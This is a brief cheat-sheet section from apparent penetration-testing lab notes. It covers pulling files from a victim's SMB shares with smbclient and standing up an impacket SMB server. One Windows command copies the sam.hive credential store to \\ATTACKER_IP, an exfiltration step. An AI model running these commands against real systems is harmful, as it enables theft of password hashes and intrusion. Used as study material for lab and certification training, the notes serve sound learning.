#### SMB (Samba)
If the victim machine ***supports SMB file sharing***, you can use `SMBclient` from your kali machine to ***access shared folders and download files***:

**Attacker's Machine**
1. List the shared resources on the victim:
```
smbclient -L //victim_ip/ -U username
```

2. Access the share and download the file:
```
smbclient //victim_ip/sharename -U username
get file.txt
```

---
### SMB Server
Files can be transferred to the attacker's machine using SMB. Start a simple ***SMB server with impacket’s `smbserver.py`***, creating a share named ***public*** pointing to the ***share*** directory:

**Kali**
```
mkdir share
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```

**Windows**
```
copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
```

